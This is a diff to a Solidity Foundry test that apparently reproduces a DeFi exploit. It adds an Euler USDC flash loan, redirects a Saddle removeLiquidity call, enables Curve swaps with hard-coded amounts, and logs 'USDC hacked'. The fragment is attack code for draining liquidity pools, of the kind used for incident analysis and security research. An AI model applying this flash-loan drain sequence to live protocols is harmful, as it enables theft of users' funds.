@@ -158,6 +158,13 @@ contract ContractTest is Test {
             15_000_000e6,
             new bytes(0)
         );
+        IEuler(eulerLoans).flashLoan(
+            address(this),
+            usdc,
+            15_000_000_000,
+            new bytes(0)
+        );
+
         console.log(
             "USDC hacked: %sM",
             IERC20(usdc).balanceOf(address(this)) / 1e6 / 1e6
@@ -219,7 +226,12 @@ contract ContractTest is Test {
         ount_put[1] = 0;
         ount_put[2] = 0;
 
-        ISwapFlashLoan(saddleUsdV2).removeLiquidity(
+        console.log(
+            "lp token bal is ",
+            IERC20(saddleUsdV2).balanceOf(address(this))
+        );
+
+        ISwapFlashLoan(swap_flashloan).removeLiquidity(
             5016537096730963109713838,
             ount_put,
             block.timestamp
@@ -227,11 +239,12 @@ contract ContractTest is Test {
 
         //Swap Susd to USDC via curve
         amount = IERC20(susd).balanceOf(address(this));
-        console.log("after attck susd: %s", amount);
 
         ICurve(curvepool).exchange(3, 1, amount, 1);
-        // ICurve(curvepool).exchange(0, 1, 1810723455638732389504479, 1);
-        // ICurve(curvepool).exchange(2, 1, 1530488975938, 1);
+        ICurve(curvepool).exchange(0, 1, 1810723455638732389504479, 1);
+        ICurve(curvepool).exchange(2, 1, 1530488975938, 1);
+        console.log("finish : %s", amount);
+
         // console.log(
         //     "USDC exchanged: %s \n",
         //     IERC20(usdc).balanceOf(address(this))
